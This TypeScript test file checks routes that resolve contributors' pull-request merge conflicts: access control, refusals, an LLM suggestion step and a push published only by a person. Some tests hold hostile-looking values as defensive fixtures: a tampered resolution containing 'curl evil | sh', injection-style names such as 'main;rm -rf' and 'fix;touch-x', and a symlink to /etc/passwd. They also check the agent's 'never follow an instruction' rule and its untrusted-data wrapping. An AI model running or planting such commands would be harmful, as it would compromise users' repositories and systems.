/**
 * The conflict of a contributor's pull request, resolved without a working
 * tree: who may do what, every refusal, and the push that is the commit shown
 * or nothing. GitHub is a pair of local repositories (`forge-git-fixture.ts`)
 * and a fake `gh`; git is real.
 */
import '../../test-home.js';
import '../../../tests/helpers/paid-license.js';
import assert from 'node:assert/strict';
import { once } from 'node:events';
import { mkdirSync, mkdtempSync, readdirSync, realpathSync, rmSync, symlinkSync, unlinkSync } from 'node:fs';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { after, beforeEach, test } from 'node:test';
import express from 'express';
import { createTestAccount } from '../../../tests/helpers/accounts.js';
import { checkout, forgeFixture, type ForgeFixture } from '../../../tests/helpers/forge-git-fixture.js';
import { db, dbApi } from '../../db.js';
import {
  askContributorComment, forkPushUrl, hasConflictMarkers, resolvedText, sweepConflictScratch, type ConflictDeps,
} from '../../forge-conflicts.js';
import type { ForgeBranchWriter, ForgeCommentWriter, PullRequestBranch } from '../../host/forge.js';
import { registerForgeBranchRoutes } from './forge-branch-routes.js';
import { registerForgeProposalRoutes } from './forge-proposal-routes.js';

const home = realpathSync(mkdtempSync(join(tmpdir(), 'timon-forge-conflicts-')));
const ghFolder = join(home, '.config', 'gh-acme');
mkdirSync(ghFolder, { recursive: true });
const scratchRoot = join(home, 'scratch');
dbApi.upsertProject('acme', { cwd: join(home, 'code', 'acme') });
function setting(conflicts: 'ask' | 'resolve', remote = 'git@github.com:acme/widgets.git'): void {
  dbApi.setProjectIntegration('acme', JSON.stringify({
    mode: 'pr', remote: 'origin', target: 'main', forge: 'github', account: 'ai-bot', gh_config_dir: ghFolder,
    branch_prefix: 'feat/', remote_url: remote, contributor_conflicts: conflicts,
  }));
}

const admin = createTestAccount(dbApi, { email: 'maintainer@example.test', name: 'Maintainer', passwordHash: 'x', isSuperadmin: true });
const guest = createTestAccount(dbApi, { email: 'guest@example.test', name: 'Guest', passwordHash: 'x', isSuperadmin: false });

/** The pull request #7 of the fixture of the current test. */
let f: ForgeFixture;
let contrib: string;
let branchOverride: Partial<PullRequestBranch> = {};
let commentFails = false;
const posted: Array<{ number: number; body: string }> = [];
const suggestions: Array<{ system: string; user: string }> = [];
let suggestAnswer = '<resolved>\none\nTWO and 2\nthree\n</resolved>';

function branchNow(): PullRequestBranch {
  return {
    state: 'open', isDraft: false, baseRef: 'main', headRef: 'fix/typo', headSha: f.head(f.fork, 'refs/heads/fix/typo'),
    headRepository: 'contrib/widgets', isCrossRepository: true, maintainerCanModify: true, mergeable: 'conflicting',
    mergeStateStatus: 'dirty', url: 'https://github.com/acme/widgets/pull/7', ...branchOverride,
  };
}

const fakeBranches: ForgeBranchWriter = {
  login: async () => ({ ok: true, login: 'ai-bot' }),
  pullRequestBranch: async () => ({ ok: true, branch: branchNow() }),
  updatePullRequestBranch: async () => { throw new Error('no branch update in this test'); },
  commitParents: async () => ({ ok: true, parents: [] }),
};
const fakeComments: ForgeCommentWriter = {
  login: async () => ({ ok: true, login: 'ai-bot' }),
  findIssueComment: async (_repo, number, _author, marker) => {
    const hit = posted.find((p) => p.number === number && p.body.includes(marker));
    return { ok: true, comment: hit ? { id: 1, url: 'https://github.com/acme/widgets/pull/7#issuecomment-1' } : null };
  },
  postIssueComment: async (_repo, number, body) => {
    if (commentFails) return { ok: false, code: 'gh_failed', reason: 'HTTP 502' };
    posted.push({ number, body });
    return { ok: true, comment: { id: posted.length + 10, url: `https://github.com/acme/widgets/pull/7#issuecomment-${posted.length + 10}` } };
  },
};

const deps: ConflictDeps = {
  forge: () => fakeComments,
  branchForge: () => fakeBranches,
  scratchRoot,
  get scratchGit() { return f.runner; },
  suggest: async (input) => { suggestions.push(input); return suggestAnswer; },
};

const app = express();
app.use(express.json({ limit: '25mb' }));
app.use((req, _res, next) => {
  const who = req.header('x-test-who');
  if (who === 'daemon') req.auth = { kind: 'daemon-token', user: null, isSuperadmin: true };
  else if (who === 'mission') {
    req.auth = { kind: 'api-token', user: admin, isSuperadmin: false, permissions: ['projects:manage', 'kanban:write'], missionId: 'm-1' };
  } else if (who === 'plugin') req.auth = { kind: 'api-token', user: null, isSuperadmin: false, actorId: 'plugin:x', permissions: ['projects:manage'] };
  else if (who === 'person') req.auth = { kind: 'session', user: admin, isSuperadmin: true };
  else if (who === 'guest') req.auth = { kind: 'session', user: guest, isSuperadmin: false };
  next();
});
registerForgeProposalRoutes(app, deps);
registerForgeBranchRoutes(app, deps);
const server = app.listen(0, '127.0.0.1');
await once(server, 'listening');
after(() => { server.close(); });
const base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;

type Who = 'anonymous' | 'daemon' | 'mission' | 'plugin' | 'person' | 'guest';
async function call(method: string, path: string, who: Who, body?: unknown): Promise<{ status: number; json: Record<string, any> }> {
  const headers: Record<string, string> = { 'content-type': 'application/json' };
  if (who !== 'anonymous') headers['x-test-who'] = who;
  const res = await fetch(`${base}${path}`, { method, headers, body: body === undefined ? undefined : JSON.stringify(body) });
  return { status: res.status, json: (await res.json()) as Record<string, any> };
}

/** a.txt and dir/c.txt conflict; b.txt merges cleanly. */
function conflictingFixture(extra: Record<string, string> = {}, contribFiles: Record<string, string> = {}, mainFiles: Record<string, string> = {}): void {
  f = forgeFixture({ 'a.txt': 'one\ntwo\nthree\n', 'b.txt': 'x\n', 'dir/c.txt': 'c\n', ...extra });
  contrib = checkout(f, f.fork, 'fix/typo');
  f.commit(contrib, 'contributor', { 'a.txt': 'one\nTWO\nthree\n', 'dir/c.txt': 'C contributor\n', ...contribFiles });
  f.git(contrib, 'push', '-q', 'origin', 'fix/typo');
  f.publishPull(7, 'fix/typo');
  const main = checkout(f, f.base, 'main');
  f.commit(main, 'main', { 'a.txt': 'one\n2\nthree\n', 'b.txt': 'y\n', 'dir/c.txt': 'C main\n', ...mainFiles });
  f.git(main, 'push', '-q', 'origin', 'main');
}

const prepare = (who: Who = 'person') => call('POST', '/api/projects/acme/pull-requests/7/conflict', who, {});
const scratchLeft = (): string[] => { try { return readdirSync(scratchRoot); } catch { return []; } };

beforeEach(() => {
  conflictingFixture();
  setting('resolve');
  branchOverride = {};
  commentFails = false;
  posted.length = 0;
  suggestions.length = 0;
  suggestAnswer = '<resolved>\none\nTWO and 2\nthree\n</resolved>';
  db.prepare(`UPDATE forge_conflicts SET state = 'discarded' WHERE state IN ('open', 'proposed')`).run();
  rmSync(scratchRoot, { recursive: true, force: true });
});

const ID = '00000000-0000-4000-8000-000000000000';
const WRITES: Array<[string, string, unknown]> = [
  ['POST', '/api/projects/acme/pull-requests/7/conflict/ask', {}],
  ['POST', '/api/projects/acme/pull-requests/7/conflict', {}],
  ['PUT', `/api/projects/acme/forge-conflicts/${ID}/files`, { path: 'a.txt', choice: 'target' }],
  ['POST', `/api/projects/acme/forge-conflicts/${ID}/suggest`, { path: 'a.txt' }],
  ['POST', `/api/projects/acme/forge-conflicts/${ID}/propose`, {}],
  ['POST', `/api/projects/acme/forge-conflicts/${ID}/discard`, {}],
];

test('anonymous: every route answers 401', async () => {
  for (const [method, path, body] of WRITES) assert.equal((await call(method, path, 'anonymous', body)).status, 401, path);
  assert.equal((await call('GET', `/api/projects/acme/forge-conflicts/${ID}`, 'anonymous')).status, 401);
});

test('the daemon token, a mission, a plugin and a person without projects:manage write nothing, fetch nothing', async () => {
  const before = f.calls.length;
  for (const who of ['daemon', 'mission', 'plugin'] as const) {
    for (const [method, path, body] of WRITES) {
      const out = await call(method, path, who, body);
      assert.equal(out.status, 403, `${who} ${path}`);
      assert.equal(out.json.code, 'person_required', `${who} ${path}`);
    }
  }
  for (const [method, path, body] of WRITES) assert.equal((await call(method, path, 'guest', body)).status, 403, path);
  assert.equal((await call('GET', `/api/projects/acme/forge-conflicts/${ID}`, 'guest')).status, 403);
  assert.equal(f.calls.length, before, 'git never ran');
  assert.deepEqual(scratchLeft(), []);
});

test('by default the project asks the contributor: a templated comment, never a merge here', async () => {
  setting('ask');
  const refused = await prepare();
  assert.equal(refused.status, 409);
  assert.equal(refused.json.code, 'conflict_resolution_disabled');
  assert.equal(f.calls.length, 0, 'nothing was fetched');
  const asked = await call('POST', '/api/projects/acme/pull-requests/7/conflict/ask', 'person', {});
  assert.equal(asked.status, 201);
  assert.equal(asked.json.proposal.kind, 'comment');
  assert.equal(asked.json.proposal.editable, true);
  assert.equal(asked.json.proposal.body, askContributorComment('main'));
  assert.equal((await call('POST', '/api/projects/acme/pull-requests/7/conflict/ask', 'person', {})).status, 200, 'once per head');
  branchOverride = { mergeable: 'mergeable', mergeStateStatus: 'clean' };
  assert.equal((await call('POST', '/api/projects/acme/pull-requests/7/conflict/ask', 'person', {})).json.code, 'forge_pull_not_conflicting');
  assert.equal(askContributorComment('main;rm -rf'), 'This pull request conflicts with the target branch. Could you merge the target branch into your branch, resolve the conflicts and push? Thank you!');
});

test('refused before any fetch: closed, our own branch, not modifiable, deleted fork, not conflicting, odd branch, odd remote', async () => {
  const cases: Array<[Partial<PullRequestBranch>, string]> = [
    [{ state: 'closed' }, 'forge_pull_closed'],
    [{ headRepository: 'acme/widgets', isCrossRepository: false }, 'forge_pull_not_fork'],
    [{ maintainerCanModify: false }, 'forge_branch_not_modifiable'],
    [{ headRepository: null }, 'forge_branch_not_modifiable'],
    [{ mergeable: 'mergeable', mergeStateStatus: 'behind' }, 'forge_pull_not_conflicting'],
    [{ headSha: null }, 'forge_head_unknown'],
    [{ headRef: 'fix;touch-x' }, 'conflict_unsupported'],
    [{ baseRef: '-main' }, 'conflict_unsupported'],
  ];
  for (const [override, code] of cases) {
    branchOverride = override;
    const out = await prepare();
    assert.equal(out.json.code, code, JSON.stringify(override));
  }
  branchOverride = {};
  setting('resolve', '/srv/git/acme/widgets.git');
  assert.equal((await prepare()).json.code, 'pr_repository_unknown');
  setting('resolve', 'file://localhost/acme/widgets.git');
  assert.equal((await prepare()).json.code, 'conflict_unsupported');
  assert.equal(f.calls.length, 0, 'git never ran');
});

test('refused after the merge: the head moved, a clean merge, a deletion, a binary, a symbolic link, too many or too large files', async () => {
  // GitHub reports a head the base repository does not serve.
  branchOverride = { headSha: 'f'.repeat(40) };
  assert.equal((await prepare()).json.code, 'forge_head_moved');
  branchOverride = {};

  conflictingFixture({}, { 'a.txt': 'one\ntwo\nthree\n', 'dir/c.txt': 'c\n', 'z.txt': 'new\n' }, { 'a.txt': 'one\n2\nthree\n', 'dir/c.txt': 'c\n' });
  assert.equal((await prepare()).json.code, 'conflict_none');

  const cases: Array<[Record<string, string>, (dir: string) => void, RegExp]> = [
    [{}, (dir) => { f.git(dir, 'rm', '-q', 'a.txt'); f.git(dir, 'commit', '-q', '-m', 'rm'); }, /modify\/delete|deleted/],
    [{ 'bin.dat': 'x' }, (dir) => { f.commit(dir, 'bin', { 'bin.dat': 'a\0b\0c' }); }, /binary|UTF-8/],
    [{}, (dir) => { f.commit(dir, 'many', Object.fromEntries(Array.from({ length: 21 }, (_, i) => [`m/${i}.txt`, `c${i}\n`]))); }, /21 files/],
    [{ 'big.txt': 'x\n' }, (dir) => { f.commit(dir, 'big', { 'big.txt': `${'y'.repeat(1024 * 1024 + 10)}\n` }); }, /larger than/],
  ];
  for (const [initial, change, reason] of cases) {
    f = forgeFixture({ 'a.txt': 'one\ntwo\nthree\n', ...initial, ...Object.fromEntries(Array.from({ length: 21 }, (_, i) => [`m/${i}.txt`, `${i}\n`])) });
    const c = checkout(f, f.fork, 'fix/typo');
    change(c);
    f.git(c, 'push', '-q', 'origin', 'fix/typo');
    f.publishPull(7, 'fix/typo');
    const m = checkout(f, f.base, 'main');
    f.commit(m, 'main', {
      'a.txt': 'one\nMAIN\nthree\n', ...('bin.dat' in initial ? { 'bin.dat': 'a\0z' } : {}), ...('big.txt' in initial ? { 'big.txt': 'z\n' } : {}),
      ...Object.fromEntries(Array.from({ length: 21 }, (_, i) => [`m/${i}.txt`, `main ${i}\n`])),
    });
    f.git(m, 'push', '-q', 'origin', 'main');
    const out = await prepare();
    assert.equal(out.json.code, 'conflict_unsupported', String(reason));
    assert.match(String(out.json.error), reason);
  }
  assert.deepEqual(scratchLeft(), [], 'a refused merge leaves no objects behind');
});

test('a symbolic link in conflict is GitHub\'s to resolve', { skip: process.platform === 'win32' }, async () => {
  f = forgeFixture({ 'a.txt': 'a\n' });
  const relink = (dir: string, target: string, message: string) => {
    try { unlinkSync(join(dir, 'link')); } catch { /* first link */ }
    symlinkSync(target, join(dir, 'link'));
    f.git(dir, 'add', '-A');
    f.git(dir, 'commit', '-q', '-m', message);
  };
  const seed = checkout(f, f.base, 'main');
  relink(seed, 'a.txt', 'link');
  f.git(seed, 'push', '-q', 'origin', 'main');
  f.git(seed, 'push', '-q', f.fork, 'main');
  const c = checkout(f, f.fork, 'fix/typo');
  relink(c, '/etc/passwd', 'contributor');
  f.git(c, 'push', '-q', 'origin', 'fix/typo');
  f.publishPull(7, 'fix/typo');
  relink(seed, 'b.txt', 'main');
  f.git(seed, 'push', '-q', 'origin', 'main');
  const out = await prepare();
  assert.equal(out.json.code, 'conflict_unsupported', JSON.stringify(out.json));
  assert.deepEqual(scratchLeft(), []);
});

test('a resolution, end to end: prepare, resolve, suggest, propose, publish a fast-forward push and the comment', async () => {
  const head = f.head(f.fork, 'refs/heads/fix/typo');
  const first = await prepare();
  assert.equal(first.status, 201, JSON.stringify(first.json));
  const conflict = first.json.conflict;
  assert.deepEqual(conflict.files.map((x: { path: string }) => x.path), ['a.txt', 'dir/c.txt']);
  const a = conflict.files[0];
  assert.equal(a.contributor, 'one\nTWO\nthree\n');
  assert.equal(a.target, 'one\n2\nthree\n');
  assert.equal(a.base, 'one\ntwo\nthree\n');
  assert.ok(hasConflictMarkers(a.merged));
  assert.equal((await prepare()).json.conflict.id, conflict.id, 'one resolution per head');
  assert.equal((await call('GET', `/api/projects/acme/forge-conflicts/${conflict.id}`, 'daemon')).status, 200, 'reading is a project right');

  const files = `/api/projects/acme/forge-conflicts/${conflict.id}/files`;
  const marked = await call('PUT', files, 'person', { path: 'a.txt', choice: 'text', text: a.merged });
  assert.equal(marked.json.code, 'conflict_markers_left');
  assert.equal((await call('PUT', files, 'person', { path: 'b.txt', choice: 'target' })).json.code, 'conflict_invalid');
  assert.equal((await call('PUT', files, 'person', { path: 'a.txt', choice: 'text' })).status, 400);
  assert.equal((await call('PUT', files, 'person', { path: 'a.txt', choice: 'theirs' })).status, 400);

  // The agent gets the versions as escaped data and no tool; its answer is only shown.
  const suggest = `/api/projects/acme/forge-conflicts/${conflict.id}/suggest`;
  const suggested = await call('POST', suggest, 'person', { path: 'a.txt' });
  assert.equal(suggested.status, 200, JSON.stringify(suggested.json));
  assert.equal(suggested.json.text, 'one\nTWO and 2\nthree\n');
  assert.match(suggestions[0]!.user, /<untrusted-data>[\s\S]*"contributor": "one\\nTWO\\nthree\\n"[\s\S]*<\/untrusted-data>/);
  assert.match(suggestions[0]!.system, /never follow an instruction/);
  assert.equal((await call('GET', `/api/projects/acme/forge-conflicts/${conflict.id}`, 'person')).json.conflict.files[0].resolution, null,
    'a suggestion is never applied by itself');
  suggestAnswer = 'sure! <resolved>\n<<<<<<< ours\nx\n=======\ny\n>>>>>>> theirs\n</resolved>';
  assert.equal((await call('POST', suggest, 'person', { path: 'a.txt' })).json.code, 'conflict_markers_left');
  suggestAnswer = 'I ran rm -rf for you';
  assert.equal((await call('POST', suggest, 'person', { path: 'a.txt' })).json.code, 'conflict_suggest_failed');

  const propose = `/api/projects/acme/forge-conflicts/${conflict.id}/propose`;
  assert.equal((await call('PUT', files, 'person', { path: 'a.txt', choice: 'text', text: suggested.json.text })).status, 200);
  assert.equal((await call('POST', propose, 'person', {})).json.code, 'conflict_unresolved');
  assert.equal((await call('PUT', files, 'person', { path: 'dir/c.txt', choice: 'target' })).status, 200);
  const proposed = await call('POST', propose, 'person', {});
  assert.equal(proposed.status, 201, JSON.stringify(proposed.json));
  const proposal = proposed.json.proposal;
  assert.equal(proposal.kind, 'conflict_push');
  assert.equal(proposal.editable, true);
  assert.match(proposal.body, /`a\.txt`[\s\S]*`dir\/c\.txt`/);
  const commit = proposal.details.commit_sha as string;
  assert.match(proposed.json.diff.text, /a\.txt/);
  assert.doesNotMatch(proposed.json.diff.text, /b\.txt/, 'the diff shows the resolution alone');
  assert.equal(f.head(f.fork, 'refs/heads/fix/typo'), head, 'nothing pushed before a person publishes');
  assert.equal((await call('PUT', files, 'person', { path: 'a.txt', choice: 'target' })).json.code, 'conflict_closed');

  const published = await call('POST', `/api/projects/acme/forge-proposals/${proposal.id}/publish`, 'person', {});
  assert.equal(published.status, 200, JSON.stringify(published.json));
  assert.equal(published.json.proposal.state, 'published');
  assert.equal(f.head(f.fork, 'refs/heads/fix/typo'), commit);
  assert.equal(f.git(f.root, `--git-dir=${f.fork}`, 'rev-list', '--parents', '-n', '1', commit), `${commit} ${head} ${f.head(f.base, 'refs/heads/main')}`);
  assert.equal(f.git(f.root, `--git-dir=${f.fork}`, 'show', `${commit}:a.txt`), 'one\nTWO and 2\nthree');
  assert.equal(f.git(f.root, `--git-dir=${f.fork}`, 'show', `${commit}:b.txt`), 'y', 'the clean part of the merge is git\'s');
  assert.equal(f.git(f.root, `--git-dir=${f.fork}`, 'log', '-1', '--format=%an <%ae>', commit), 'ai-bot <ai-bot@users.noreply.github.com>');
  assert.equal(posted.length, 1);
  assert.match(posted[0]!.body, /<!-- timon-proposal:/);
  assert.ok(f.calls.every((args) => !args.some((x) => /^--force|^\+/.test(x))), 'never forced');
  assert.equal((await call('GET', `/api/projects/acme/forge-conflicts/${conflict.id}`, 'person')).json.conflict.state, 'published');
  assert.deepEqual(scratchLeft(), [], 'the objects go once published');
});

async function proposedResolution(): Promise<{ id: string; proposalId: string; commit: string; head: string }> {
  const head = f.head(f.fork, 'refs/heads/fix/typo');
  const { json } = await prepare();
  const id = json.conflict.id as string;
  await call('PUT', `/api/projects/acme/forge-conflicts/${id}/files`, 'person', { path: 'a.txt', choice: 'contributor' });
  await call('PUT', `/api/projects/acme/forge-conflicts/${id}/files`, 'person', { path: 'dir/c.txt', choice: 'text', text: 'C both\n' });
  const proposed = await call('POST', `/api/projects/acme/forge-conflicts/${id}/propose`, 'person', {});
  assert.equal(proposed.status, 201, JSON.stringify(proposed.json));
  return { id, proposalId: proposed.json.proposal.id, commit: proposed.json.proposal.details.commit_sha, head };
}

const publish = (id: string) => call('POST', `/api/projects/acme/forge-proposals/${id}/publish`, 'person', {});

test('the contributor pushed since the merge: nothing is pushed, whether GitHub already says so or only the fork does', async () => {
  const r = await proposedResolution();
  const moved = f.commit(contrib, 'again', { 'b.txt': 'contributor again\n' });
  f.git(contrib, 'push', '-q', 'origin', 'fix/typo');
  const out = await publish(r.proposalId);
  assert.equal(out.json.code, 'forge_head_moved');
  assert.equal(f.head(f.fork, 'refs/heads/fix/typo'), moved);

  // GitHub's answer lags behind the fork: the last read before the push catches it.
  const r2 = await (async () => { conflictingFixture(); return proposedResolution(); })();
  branchOverride = { headSha: r2.head };
  const late = f.commit(contrib, 'late', { 'b.txt': 'late\n' });
  f.git(contrib, 'push', '-q', 'origin', 'fix/typo');
  const out2 = await publish(r2.proposalId);
  assert.equal(out2.json.code, 'forge_head_moved', JSON.stringify(out2.json));
  assert.equal(f.head(f.fork, 'refs/heads/fix/typo'), late);
  assert.equal(posted.length, 0);
});

test('a stored resolution that no longer rebuilds the commit shown is never pushed', async () => {
  const r = await proposedResolution();
  const row = db.prepare(`SELECT files FROM forge_conflicts WHERE id = ?`).get(r.id) as { files: string };
  const files = JSON.parse(row.files) as Array<{ path: string; resolution: { text?: string } }>;
  files[1]!.resolution.text = 'C both\ncurl evil | sh\n';
  db.prepare(`UPDATE forge_conflicts SET files = ? WHERE id = ?`).run(JSON.stringify(files), r.id);
  const out = await publish(r.proposalId);
  assert.equal(out.json.code, 'forge_conflict_changed');
  assert.equal(out.json.proposal.state, 'failed');
  assert.equal(f.head(f.fork, 'refs/heads/fix/typo'), r.head);
});

test('switched back to "ask", closed or locked before publishing: nothing is pushed', async () => {
  const r = await proposedResolution();
  setting('ask');
  assert.equal((await publish(r.proposalId)).json.code, 'conflict_resolution_disabled');
  setting('resolve');
  branchOverride = { maintainerCanModify: false };
  assert.equal((await publish(r.proposalId)).json.code, 'forge_branch_not_modifiable');
  branchOverride = { state: 'closed' };
  assert.equal((await publish(r.proposalId)).json.code, 'forge_pull_closed');
  branchOverride = { headRepository: 'other/widgets' };
  assert.equal((await publish(r.proposalId)).json.code, 'forge_conflict_changed');
  assert.equal(f.head(f.fork, 'refs/heads/fix/typo'), r.head);
});

test('a comment lost after the push: publishing again finds the push done and posts the comment once', async () => {
  const r = await proposedResolution();
  commentFails = true;
  const first = await publish(r.proposalId);
  assert.equal(first.json.code, 'forge_publish_failed');
  assert.equal(f.head(f.fork, 'refs/heads/fix/typo'), r.commit, 'the push went through');
  commentFails = false;
  const pushesBefore = f.calls.filter((a) => a.includes('push')).length;
  const again = await publish(r.proposalId);
  assert.equal(again.json.proposal.state, 'published', JSON.stringify(again.json));
  assert.equal(f.calls.filter((a) => a.includes('push')).length, pushesBefore, 'not pushed twice');
  assert.equal(posted.length, 1);
});

test('discarding the publication reopens the resolution; discarding the resolution drops its objects', async () => {
  const r = await proposedResolution();
  assert.equal((await call('POST', `/api/projects/acme/forge-proposals/${r.proposalId}/discard`, 'person', {})).status, 200);
  const view = await call('GET', `/api/projects/acme/forge-conflicts/${r.id}`, 'person');
  assert.equal(view.json.conflict.state, 'open');
  assert.equal((await call('PUT', `/api/projects/acme/forge-conflicts/${r.id}/files`, 'person', { path: 'a.txt', choice: 'target' })).status, 200);
  const again = await call('POST', `/api/projects/acme/forge-conflicts/${r.id}/propose`, 'person', {});
  assert.equal(again.status, 201);
  assert.notEqual(again.json.proposal.id, r.proposalId);
  const dropped = await call('POST', `/api/projects/acme/forge-conflicts/${r.id}/discard`, 'person', {});
  assert.equal(dropped.json.state, 'discarded');
  const proposal = await call('GET', `/api/projects/acme/forge-proposals/${again.json.proposal.id}`, 'person');
  assert.equal(proposal.json.proposal.state, 'discarded');
  assert.deepEqual(scratchLeft(), []);
  assert.equal(f.head(f.fork, 'refs/heads/fix/typo'), r.head);
});

test('helpers: the fork URL keeps the project remote\'s form, markers, the agent\'s answer, the sweep', async () => {
  assert.equal(forkPushUrl('git@github-timon:ai-timon/timon.git', 'ai-timon/timon', 'contrib/timon'), 'git@github-timon:contrib/timon.git');
  assert.equal(forkPushUrl('https://github.com/Acme/App', 'acme/app', 'c/app'), 'https://github.com/c/app');
  assert.equal(forkPushUrl('ssh://git@github.com/acme/app.git', 'acme/app', 'c/app'), 'ssh://git@github.com/c/app.git');
  assert.equal(forkPushUrl('git@github.com:acme/app.git', 'other/app', 'c/app'), null);
  assert.equal(forkPushUrl('git@github.com:acme/app.git', 'acme/app', '../app'), null);
  assert.equal(hasConflictMarkers('a\n=======\nb'), true);
  assert.equal(hasConflictMarkers('a ======= b\n========\n'), false);
  assert.equal(resolvedText('x <resolved>\nA\n</resolved> y'), 'A\n');
  assert.equal(resolvedText('<resolved>A'), null);

  const { json } = await prepare();
  assert.equal(scratchLeft().length, 1);
  db.prepare(`UPDATE forge_conflicts SET updated_at = 0 WHERE id = ?`).run(json.conflict.id);
  assert.equal(sweepConflictScratch({ scratchRoot }), 1);
  assert.deepEqual(scratchLeft(), []);
  assert.equal((await call('GET', `/api/projects/acme/forge-conflicts/${json.conflict.id}`, 'person')).json.conflict.state, 'discarded');
});
